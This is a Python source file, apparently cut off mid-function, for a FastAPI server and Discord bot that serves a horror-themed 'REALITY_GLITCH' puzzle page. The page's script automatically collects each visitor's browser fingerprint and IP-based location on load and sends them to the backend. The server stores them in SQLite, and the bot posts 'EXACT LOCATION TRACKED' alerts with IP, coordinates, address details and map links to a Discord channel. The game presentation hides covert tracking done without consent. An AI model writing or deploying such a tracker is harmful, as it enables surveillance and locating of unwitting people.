import os
import json
import random
import asyncio
import threading
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from pydantic import BaseModel
import sqlite3
import hashlib
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIGURATION ====================
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
RENDER = os.getenv('RENDER', False)  # Check if running on Render

# ==================== DATA MODELS ====================
class TrackingData(BaseModel):
    type: str
    data: dict
    timestamp: str
    userAgent: str = ""

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

# Allow all origins - update with your actual frontend URL
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://gamef-swart.vercel.app",
        "http://localhost:3000",
        "http://localhost:8000"
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP (Use /tmp for Render) ====================
DB_PATH = '/tmp/nexus.db' if RENDER else 'nexus.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP, visit_count INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                  address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
                  neighbourhood TEXT, road TEXT, house_number TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
                  memory TEXT, screen TEXT, timezone TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fragments
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS button_presses
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS threats
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== HTML TEMPLATE ====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔮 NEXUS://REALITY_GLITCH</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @keyframes corrupt {
            0% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
            10% { transform: translate(-10px, 10px) rotate(1deg); filter: hue-rotate(90deg) blur(2px); }
            20% { transform: translate(10px, -10px) rotate(-1deg); filter: hue-rotate(180deg) blur(0px); }
            30% { transform: translate(-5px, 5px) rotate(2deg); filter: hue-rotate(270deg) blur(3px); }
            40% { transform: translate(5px, -5px) rotate(-2deg); filter: hue-rotate(360deg) blur(1px); }
            50% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
        }

        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
            background-image: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 2px);
        }

        .terminal {
            background: rgba(0,20,0,0.9);
            border: 2px solid #0f0;
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
            padding: 20px;
            margin: 20px;
            position: relative;
        }

        .terminal::before {
            content: ">";
            position: absolute;
            left: -15px;
            top: 50%;
            transform: translateY(-50%);
            color: #0f0;
            font-size: 24px;
            animation: pulse-red 1s infinite;
        }

        @keyframes pulse-red {
            0% { text-shadow: 0 0 5px #ff0000; }
            50% { text-shadow: 0 0 30px #ff0000; }
            100% { text-shadow: 0 0 5px #ff0000; }
        }

        .glitch-text {
            font-size: 2rem;
            color: #0f0;
            text-shadow: 2px 2px 0 #ff0000, -2px -2px 0 #0000ff;
            animation: corrupt 5s infinite;
            margin-bottom: 20px;
        }

        .data-stream {
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: #0f0;
            line-height: 12px;
            opacity: 0.5;
            white-space: pre;
            overflow: hidden;
            height: 100px;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            pointer-events: none;
            z-index: 9999;
        }

        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 25px;
            padding: 20px;
            max-width: 2000px;
            margin: 0 auto;
        }

        .puzzle-card {
            background: rgba(0,30,0,0.95);
            border: 3px solid #0f0;
            padding: 20px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            min-height: 300px;
            box-shadow: 0 0 50px rgba(0,255,0,0.2);
        }

        .puzzle-card:hover {
            transform: scale(1.02);
            border-color: #ff0000;
            box-shadow: 0 0 80px rgba(255,0,0,0.4);
        }

        .puzzle-card::after {
            content: "";
            position: absolute;
            top: -100%;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent, rgba(0,255,0,0.1));
            animation: scan 3s linear infinite;
            pointer-events: none;
        }

        .card-header {
            font-size: 1.5rem;
            color: #0f0;
            border-bottom: 2px dashed #0f0;
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .btn {
            background: #000;
            color: #0f0;
            border: 3px solid #0f0;
            padding: 15px 25px;
            font-size: 1.2rem;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin: 10px 0;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 50px #0f0;
            transform: scale(1.05);
        }

        .btn.danger:hover {
            background: #ff0000;
            border-color: #ff0000;
            box-shadow: 0 0 50px #ff0000;
        }

        .data-panel {
            background: #000;
            border: 2px solid #0f0;
            padding: 15px;
            font-size: 0.9rem;
            max-height: 250px;
            overflow-y: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .location-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 15px 0;
        }

        .coord-display {
            background: #000;
            border: 2px solid #0f0;
            padding: 10px;
            text-align: center;
            font-size: 1.5rem;
            animation: flicker 2s infinite;
        }

        .threat-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 200px;
            height: 200px;
            border: 4px solid #0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            animation: pulse-red 2s infinite;
        }

        .threat-number {
            font-size: 3rem;
            color: #ff0000;
        }

        .timeline {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            height: 5px;
            background: #0f0;
            z-index: 9999;
        }

        .timeline-progress {
            height: 100%;
            width: 0%;
            background: #ff0000;
            transition: width 1s;
        }

        .hidden-message {
            color: #000;
            background: #000;
            cursor: pointer;
            transition: all 0.3s;
        }

        .hidden-message:hover {
            color: #0f0;
            background: transparent;
        }

        .puzzle-piece {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 2px solid #0f0;
            margin: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .puzzle-piece.found {
            background: #0f0;
            box-shadow: 0 0 30px #0f0;
        }

        .qr-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }

        .timeline-event {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            color: #0f0;
            font-size: 0.8rem;
            white-space: nowrap;
        }

        .satellite-img {
            width: 100%;
            height: 200px;
            border: 2px solid #0f0;
            object-fit: cover;
            filter: grayscale(100%) contrast(1.2);
        }
    </style>
</head>
<body>
    <!-- Matrix rain background -->
    <canvas id="matrixCanvas" class="matrix-rain" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; opacity:0.1;"></canvas>
    
    <!-- Threat indicator -->
    <div class="threat-indicator">
        <div>THREAT LEVEL</div>
        <div class="threat-number" id="threatLevel">0</div>
        <div id="threatMessage">SCANNING</div>
    </div>

    <!-- Timeline -->
    <div class="timeline">
        <div class="timeline-progress" id="timelineProgress"></div>
        <div class="timeline-event" id="timelineEvent">INITIALIZING...</div>
    </div>

    <!-- Data stream -->
    <div class="data-stream" id="dataStream"></div>

    <!-- Main header -->
    <div class="terminal" style="margin: 10px;">
        <div class="glitch-text" id="mainHeader">> REALITY_GLITCH.exe // NEXUS v2.3.3.7</div>
        <div id="systemTime" style="color: #0f0; font-size: 0.9rem;"></div>
        <div id="coordinates" style="color: #0f0; font-size: 0.9rem;"></div>
    </div>

    <!-- Main puzzle grid -->
    <div class="grid-container">
        <!-- GEOLOCATION NEXUS -->
        <div class="puzzle-card">
            <div class="card-header">🌍 GEOLOCATION NEXUS</div>
            <div class="location-grid">
                <div class="coord-display" id="latitude">--.----</div>
                <div class="coord-display" id="longitude">--.----</div>
            </div>
            <div id="address" class="data-panel">Acquiring location data...</div>
            <div id="nearbyPlaces" class="data-panel" style="max-height: 150px;"></div>
            <button class="btn" id="forceLocation">📍 FORCE SCAN</button>
        </div>

        <!-- SYSTEM FINGERPRINT -->
        <div class="puzzle-card">
            <div class="card-header">💻 SYSTEM FINGERPRINT</div>
            <div id="sysInfo" class="data-panel"></div>
            <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
            <div id="hardwareInfo" class="data-panel" style="display: none;"></div>
        </div>

        <!-- THE BUTTON (DO NOT PRESS) -->
        <div class="puzzle-card">
            <div class="card-header">🚫 [REDACTED]</div>
            <button class="btn danger" id="forbiddenButton">!!! DO NOT PRESS !!!</button>
            <div id="pressHistory" class="data-panel"></div>
            <div id="buttonMessages" class="data-panel" style="color: #ff0000;"></div>
        </div>

        <!-- AUDIO FREQUENCY ANALYZER -->
        <div class="puzzle-card">
            <div class="card-header">🎵 AUDIO FREQUENCIES</div>
            <canvas id="audioVisualizer" width="300" height="100" style="width:100%; height:100px; border:2px solid #0f0; margin:10px 0;"></canvas>
            <button class="btn" id="playFrequency">🔊 TRANSMIT</button>
            <input type="range" id="frequencySlider" min="20" max="2000" value="440" style="width:100%; margin:10px 0;">
            <div id="audioMessage" class="data-panel"></div>
        </div>

        <!-- NAME RITUAL -->
        <div class="puzzle-card">
            <div class="card-header">📝 NAME RITUAL</div>
            <input type="text" id="ritualName" class="data-panel" placeholder="Enter name..." style="width:100%;">
            <button class="btn" id="summonName">🔮 SUMMON</button>
            <div id="nameResult" class="data-panel"></div>
            <div id="nameHistory" class="data-panel" style="max-height: 100px;"></div>
        </div>

        <!-- ARCHIVE FOOTAGE -->
        <div class="puzzle-card">
            <div class="card-header">🏛️ ARCHIVE FOOTAGE</div>
            <img id="archiveImage" class="satellite-img" src="" alt="Archive">
            <div id="archiveLabel" class="data-panel">Loading...</div>
            <button class="btn" id="nextArchive">🔄 NEXT FRAME</button>
        </div>

        <!-- QUANTUM RANDOMIZER -->
        <div class="puzzle-card">
            <div class="card-header">🌀 QUANTUM RANDOMIZER</div>
            <div id="randomNumbers" class="data-panel">-- -- -- -- --</div>
            <button class="btn" id="generateRandom">🎲 GENERATE</button>
            <div id="randomSource" class="data-panel"></div>
        </div>

        <!-- CIPHER DECODER -->
        <div class="puzzle-card">
            <div class="card-header">🔐 CIPHER DECODER</div>
            <textarea id="cipherInput" class="data-panel" placeholder="Enter cipher..." rows="2"></textarea>
            <button class="btn" id="decodeCipher">🔓 DECODE</button>
            <div id="cipherOutput" class="data-panel"></div>
        </div>

        <!-- TIMELINE ANOMALIES -->
        <div class="puzzle-card">
            <div class="card-header">⏳ TIMELINE ANOMALIES</div>
            <div id="timelineEvents" class="data-panel"></div>
            <button class="btn" id="scanTimeline">📅 SCAN TIMELINE</button>
        </div>

        <!-- COLLECTIBLES / PUZZLE PIECES -->
        <div class="puzzle-card">
            <div class="card-header">🧩 REALITY FRAGMENTS</div>
            <div id="puzzlePieces" class="qr-container"></div>
            <div id="fragmentsFound">0/9 fragments collected</div>
        </div>

        <!-- DEEP WEB NEXUS -->
        <div class="puzzle-card">
            <div class="card-header">🌐 DEEP WEB NEXUS</div>
            <button class="btn" id="scrapeDarkWeb">💀 SCRAPE</button>
            <div id="darkWebData" class="data-panel"></div>
        </div>

        <!-- CONSPIRACY GENERATOR -->
        <div class="puzzle-card">
            <div class="card-header">👁️ CONSPIRACY GENERATOR</div>
            <button class="btn" id="generateTheory">🤔 GENERATE</button>
            <div id="conspiracyText" class="data-panel"></div>
        </div>

        <!-- SATELLITE IMAGERY -->
        <div class="puzzle-card">
            <div class="card-header">🛰️ SATELLITE IMAGERY</div>
            <img id="satelliteImage" class="satellite-img" src="" alt="Satellite">
            <button class="btn" id="refreshSatellite">🔄 REFRESH</button>
        </div>

        <!-- ENCRYPTED MESSAGES -->
        <div class="puzzle-card">
            <div class="card-header">📨 ENCRYPTED MESSAGES</div>
            <div id="encryptedMessages" class="data-panel"></div>
            <button class="btn" id="newMessage">📩 RECEIVE</button>
        </div>
    </div>

    <!-- Hidden footer with secrets -->
    <div class="terminal" style="margin-top: 50px;">
        <div style="text-align: center; color: #0f0; opacity: 0.5;" id="footerText">
            > SYSTEM STATUS: [ACTIVE] // USERS ONLINE: <span id="onlineUsers">0000</span> // ENCRYPTION: [AES-256]
        </div>
        <div class="hidden-message" onclick="revealSecret(1)">[CLICK HERE FOR SECRET MESSAGE]</div>
    </div>

    <script>
        // ==================== CONFIG ====================
        const BACKEND_URL = window.location.origin;
        let puzzlePieces = 0;
        let buttonPresses = 0;
        let threatLevel = 0;
        let currentLocation = null;
        let archiveIndex = 0;

        // ==================== AUTO DATA COLLECTION ====================
        async function collectAllData() {
            const systemData = {
                platform: navigator.platform,
                browser: navigator.userAgent,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || '?',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                cookies: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };

            document.getElementById('sysInfo').innerHTML = `
Platform: ${systemData.platform}<br>
Browser: ${systemData.browser.substring(0, 40)}...<br>
Cores: ${systemData.cores}<br>
Memory: ${systemData.memory}GB<br>
Screen: ${systemData.screen}<br>
Timezone: ${systemData.timezone}<br>
Language: ${systemData.language}
            `;

            await sendToBackend('system', systemData);
        }

        // ==================== LOCATION (IP-based) ====================
        async function getLocation() {
            try {
                const ipResponse = await fetch('http://ip-api.com/json/');
                const ipData = await ipResponse.json();
                
                if (ipData.status === 'success') {
                    currentLocation = {
                        lat: ipData.lat,
                        lon: ipData.lon,
                        city: ipData.city,
                        country: ipData.country,
                        region: ipData.regionName,
                        postal: ipData.zip,
                        accuracy: 1000,
                        source: 'ip'
                    };

                    document.getElementById('latitude').textContent = currentLocation.lat.toFixed(6);
                    document.getElementById('longitude').textContent = currentLocation.lon.toFixed(6);
                    document.getElementById('coordinates').textContent = `${currentLocation.lat.toFixed(4)}, ${currentLocation.lon.toFixed(4)}`;
                    document.getElementById('address').innerHTML = `
📍 IP Geolocation<br>
City: ${currentLocation.city}<br>
Country: ${currentLocation.country}<br>
Region: ${currentLocation.region}<br>
ZIP: ${currentLocation.postal || 'N/A'}<br>
ISP: ${ipData.isp || 'Unknown'}
                    `;

                    getNearbyPlaces();
                    updateSatellite();
                    await sendToBackend('location', currentLocation);
                    updateThreatLevel(20);
                }
            } catch (e) {
                console.log('IP location failed:', e);
            }
        }

        // ==================== NEARBY PLACES ====================
        function getNearbyPlaces() {
            const places = [
                '🔴 Traffic Camera', '🏢 Government Building', '📡 Cell Tower',
                '🏦 Bank', '🚦 Traffic Light', '🚇 Subway Station',
                '🏥 Hospital', '🏫 School', '🛒 Shopping Center'
            ];
            
            const nearby = [];
            for (let i = 0; i < 5; i++) {
                const place = places[Math.floor(Math.random() * places.length)];
                const distance = (Math.random() * 500).toFixed(1);
                nearby.push(`${place} - ${distance}m`);
            }
            
            document.getElementById('nearbyPlaces').innerHTML = nearby.join('<br>');
        }

        // ==================== SATELLITE IMAGERY ====================
        function updateSatellite() {
            if (currentLocation) {
                const lat = currentLocation.lat;
                const lon = currentLocation.lon;
                
                // Using placeholder images (replace with actual satellite API if needed)
                document.getElementById('satelliteImage').src = `https://picsum.photos/400/200?random=${Math.random()}`;
                
                // Archive footage
                const archives = [
                    'https://picsum.photos/id/1015/400/200',
                    'https://picsum.photos/id/1018/400/200',
                    'https://picsum.photos/id/1043/400/200',
                    'https://picsum.photos/id/1044/400/200',
                    'https://picsum.photos/id/1045/400/200'
                ];
                
                document.getElementById('archiveImage').src = archives[archiveIndex % archives.length];
                document.getElementById('archiveLabel').innerHTML = `Archive Footage #${archiveIndex + 1}`;
            }
        }

        // ==================== THREAT SYSTEM ====================
        function updateThreatLevel(increase) {
            threatLevel = Math.min(100, threatLevel + increase);
            document.getElementById('threatLevel').textContent = threatLevel;
            document.getElementById('timelineProgress').style.width = threatLevel + '%';
            
            if (threatLevel < 30) {
                document.getElementById('threatMessage').textContent = 'LOW - SCANNING';
            } else if (threatLevel < 60) {
                document.getElementById('threatMessage').textContent = 'MEDIUM - WATCHING';
            } else if (threatLevel < 90) {
                document.getElementById('threatMessage').textContent = 'HIGH - TRACKING';
            } else {
                document.getElementById('threatMessage').textContent = 'CRITICAL - DETECTED';
            }

            sendToBackend('threat', { level: threatLevel, message: document.getElementById('threatMessage').textContent });
        }

        // ==================== PUZZLE PIECES ====================
        function addPuzzlePiece() {
            if (puzzlePieces < 9) {
                puzzlePieces++;
                document.getElementById('fragmentsFound').textContent = `${puzzlePieces}/9 fragments collected`;
                
                const container = document.getElementById('puzzlePieces');
                const piece = document.createElement('div');
                piece.className = 'puzzle-piece found';
                container.appendChild(piece);

                sendToBackend('fragment', { fragment: puzzlePieces });

                if (puzzlePieces === 9) {
                    setTimeout(() => {
                        alert('⚠️ REALITY FRAGMENTS ASSEMBLED ⚠️');
                        updateThreatLevel(50);
                    }, 500);
                }
            }
        }

        // ==================== BUTTON MESSAGES ====================
        const buttonMessages = [
            "Why did you do that?",
            "They're watching now.",
            "The button is bleeding.",
            "Check your surroundings.",
            "Only 5 presses left...",
            "You shouldn't have done that.",
            "They know your name.",
            "It's too late now.",
            "The screen is glitching.",
            "Behind you."
        ];

        // ==================== MATRIX RAIN ====================
        function initMatrixRain() {
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const chars = '01010101010101010101アイウエオカキクケコ';
            const columns = canvas.width / 20;
            const drops = [];

            for (let i = 0; i < columns; i++) {
                drops[i] = 1;
            }

            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                ctx.fillStyle = '#0f0';
                ctx.font = '15px monospace';

                for (let i = 0; i < drops.length; i++) {
                    const text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * 20, drops[i] * 20);

                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            setInterval(draw, 35);
        }

        // ==================== DATA STREAM ====================
        function startDataStream() {
            setInterval(() => {
                const stream = document.getElementById('dataStream');
                const hex = Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
                const data = `[${new Date().toLocaleTimeString()}] [${hex}] TRANSMITTING: ${Math.random().toString(36).substring(7)}...\n`;
                stream.innerHTML = data + stream.innerHTML;
                if (stream.innerHTML.length > 1000) {
                    stream.innerHTML = stream.innerHTML.substring(0, 1000);
                }
            }, 100);
        }

        // ==================== BACKEND COMMUNICATION ====================
        async function sendToBackend(type, data) {
            try {
                await fetch(`${BACKEND_URL}/api/track`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: type,
                        data: data,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
            } catch (e) {
                console.log('Backend error:', e);
            }
        }

        // ==================== EVENT LISTENERS ====================
        document.addEventListener('DOMContentLoaded', () => {
            collectAllData();
            getLocation();
            initMatrixRain();
            startDataStream();
            
            setInterval(() => {
                document.getElementById('systemTime').textContent = `> TIME: ${new Date().toLocaleString()}`;
            }, 1000);

            setInterval(() => {
                document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 9000 + 1000);
            }, 5000);
        });

        // Force location
        document.getElementById('forceLocation').addEventListener('click', () => {
            document.getElementById('address').innerHTML = 'FORCING GEOLOCATION...';
            getLocation();
            addPuzzlePiece();
        });

        // Deep scan
        document.getElementById('deepScan').addEventListener('click', () => {
            const hardwareDiv = document.getElementById('hardwareInfo');
            hardwareDiv.style.display = 'block';
            hardwareDiv.innerHTML = `
Cores: ${navigator.hardwareConcurrency}<br>
Memory: ${navigator.deviceMemory || '?'}GB<br>
Touch Points: ${navigator.maxTouchPoints}<br>
Platform: ${navigator.platform}<br>
Language: ${navigator.language}<br>
Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}<br>
Online: ${navigator.onLine ? 'Yes' : 'No'}
            `;
            addPuzzlePiece();
            sendToBackend('deep_scan', { depth: 'full' });
        });

        // Forbidden button
        document.getElementById('forbiddenButton').addEventListener('click', () => {
            buttonPresses++;
            const history = document.getElementById('pressHistory');
            const messages = document.getElementById('buttonMessages');
            
            history.innerHTML = `Presses: ${buttonPresses}<br>` + history.innerHTML;
            
            if (buttonPresses <= buttonMessages.length) {
                messages.innerHTML = buttonMessages[buttonPresses - 1];
            }

            updateThreatLevel(5);
            sendToBackend('button', { presses: buttonPresses, message: buttonMessages[buttonPresses - 1] || 'Unknown' });

            if ([3, 6, 9].includes(buttonPresses)) {
                addPuzzlePiece();
            }

            if (buttonPresses === 9) {
                messages.innerHTML = "⚠️ COORDINATES REVEALED: 60.233, 24.866 ⚠️";
                updateThreatLevel(30);
            }
        });

        // Audio frequency
        document.getElementById('playFrequency').addEventListener('click', () => {
            const freq = document.getElementById('frequencySlider').value;
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            
            osc.type = 'sine';
            osc.frequency.value = freq;
            gain.gain.value = 0.1;
            
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.5);

            document.getElementById('audioMessage').innerHTML = `Transmitting at ${freq}Hz...`;
            
            const canvas = document.getElementById('audioVisualizer');
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.fillRect(0, 0, freq / 10, 100);
        });

        // Name ritual
        document.getElementById('summonName').addEventListener('click', () => {
            const name = document.getElementById('ritualName').value;
            if (!name) return;

            const match = Math.floor(Math.random() * 100);
            const result = document.getElementById('nameResult');
            
            if (name.toLowerCase() === 'helsinki' || name === '60.233, 24.866') {
                result.innerHTML = '⚠️ REALITY BREACH DETECTED ⚠️';
                updateThreatLevel(50);
                addPuzzlePiece();
                sendToBackend('name_ritual', { name: name, match: 100, special: true });
            } else {
                result.innerHTML = `"${name}" added to database. ${match}% match found.`;
                sendToBackend('name_ritual', { name: name, match: match, special: false });
            }
        });

        // Next archive
        document.getElementById('nextArchive').addEventListener('click', () => {
            archiveIndex++;
            updateSatellite();
            
            if (archiveIndex === 4) {
                document.getElementById('archiveLabel').innerHTML += ' ⚠️ COORDINATES FOUND: 60.233, 24.866';
                addPuzzlePiece();
            }
        });

        // Random generator
        document.getElementById('generateRandom').addEventListener('click', () => {
            const nums = [];
            for (let i = 0; i < 5; i++) {
                nums.push(Math.floor(Math.random() * 100));
            }
            document.getElementById('randomNumbers').textContent = nums.join(' - ');
            document.getElementById('randomSource').innerHTML = 'Source: Quantum Entropy';
            
            const special = nums.includes(42) || nums.includes(23) || nums.includes(66);
            sendToBackend('random', { numbers: nums.join(' '), special: special });
            
            if (special) addPuzzlePiece();
        });

        // Cipher decoder
        document.getElementById('decodeCipher').addEventListener('click', () => {
            const input = document.getElementById('cipherInput').value;
            
            // ROT13
            const decoded = input.replace(/[a-zA-Z]/g, c => 
                String.fromCharCode(c <= 'Z' ? 90 : 122 >= c ? 
                c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13));
            
            document.getElementById('cipherOutput').innerHTML = decoded;
            
            const special = decoded.toLowerCase().includes('helsinki') || decoded.toLowerCase().includes('midnight');
            sendToBackend('cipher', { input: input, output: decoded, special: special });
            
            if (special) addPuzzlePiece();
        });

        // Timeline scan
        document.getElementById('scanTimeline').addEventListener('click', () => {
            const events = [
                "2023-12-21: Your IP logged",
                "2024-01-15: Camera detected",
                "2024-02-03: Location ping",
                "2024-02-28: System fingerprint stored",
                "2024-03-15: Pattern recognized",
                new Date().toISOString().split('T')[0] + ": You are here"
            ];
            
            document.getElementById('timelineEvents').innerHTML = events.join('<br>');
            addPuzzlePiece();
        });

        // Dark web scrape
        document.getElementById('scrapeDarkWeb').addEventListener('click', () => {
            const data = [
                "> Selling user data: $0.01",
                "> Your location available",
                "> Camera feeds online",
                "> 237 profiles match you"
            ];
            document.getElementById('darkWebData').innerHTML = data.join('<br>');
            updateThreatLevel(10);
            sendToBackend('darkweb', { data: data.join('\\n'), threat: 10 });
        });

        // Conspiracy generator
        document.getElementById('generateTheory').addEventListener('click', () => {
            const theories = [
                "The cameras are watching you through your screen",
                "Your microphone is always listening",
                "They know where you live",
                "The button knows your name",
                "Your browser is leaking data",
                "The screen is a two-way mirror"
            ];
            document.getElementById('conspiracyText').innerHTML = theories[Math.floor(Math.random() * theories.length)];
            sendToBackend('conspiracy', { theory: document.getElementById('conspiracyText').innerHTML });
        });

        // Satellite refresh
        document.getElementById('refreshSatellite').addEventListener('click', updateSatellite);

        // New message
        document.getElementById('newMessage').addEventListener('click', () => {
            const messages = [
                "FROM: UNKNOWN\\nSUBJ: They're watching",
                "FROM: SYSTEM\\nSUBJ: Location ping received",
                "FROM: DARKWEB\\nSUBJ: Your data for sale",
                "FROM: 60.233,24.866\\nSUBJ: Come find us"
            ];
            document.getElementById('encryptedMessages').innerHTML = messages[Math.floor(Math.random() * messages.length)];
        });

        // Secret reveal
        window.revealSecret = (num) => {
            const secrets = [
                "The button knows...",
                "Check at midnight...",
                "60.233, 24.866",
                "They're behind you",
                "Your screen is glitching"
            ];
            alert(secrets[num - 1]);
            addPuzzlePiece();
        };
    </script>
</body>
</html>
"""

# ==================== DISCORD BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class DiscordBot:
    def __init__(self):
        self.bot = bot
        self.ready = False
        self.channel = None
    
    async def start(self):
        try:
            await self.bot.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    async def send_location_to_discord(self, user_id: str, data: dict, ip: str):
        """Send exact location to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="📍 EXACT LOCATION TRACKED",
                color=Color.red(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            
            embed.add_field(
                name="📍 Coordinates", 
                value=f"```\nLat: {data.get('lat', '?')}\nLon: {data.get('lon', '?')}\nAcc: {data.get('accuracy', '?')}m```", 
                inline=False
            )
            
            if data.get('address'):
                embed.add_field(
                    name="🏠 Full Address",
                    value=f"```{data.get('address')}```",
                    inline=False
                )
            
            details = []
            if data.get('house_number'): details.append(f"🏠 House: {data.get('house_number')}")
            if data.get('road'): details.append(f"🛣️ Road: {data.get('road')}")
            if data.get('neighbourhood'): details.append(f"🏘️ Area: {data.get('neighbourhood')}")
            if data.get('city'): details.append(f"🏙️ City: {data.get('city')}")
            if data.get('county'): details.append(f"🗺️ County: {data.get('county')}")
            if data.get('state'): details.append(f"📍 State: {data.get('state')}")
            if data.get('zip'): details.append(f"📮 ZIP: {data.get('zip')}")
            if data.get('country'): details.append(f"🌍 Country: {data.get('country')}")
            
            if details:
                embed.add_field(name="📋 Details", value="\n".join(details), inline=False)
            
            maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
            embed.add_field(name="🗺️ Google Maps", value=f"[Click to view]({maps_url})", inline=True)
            
            street_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}&layer=c"
            embed.add_field(name="📸 Street View", value=f"[Click to view]({street_url})", inline=True)
            
            threat = data.get('threat', random.randint(30, 70))
            embed.add_field(name="⚠️ Threat", value=f"`{threat}%`", inline=True)
            
            embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_system_to_discord(self, user_id: str, data: dict, ip: str):
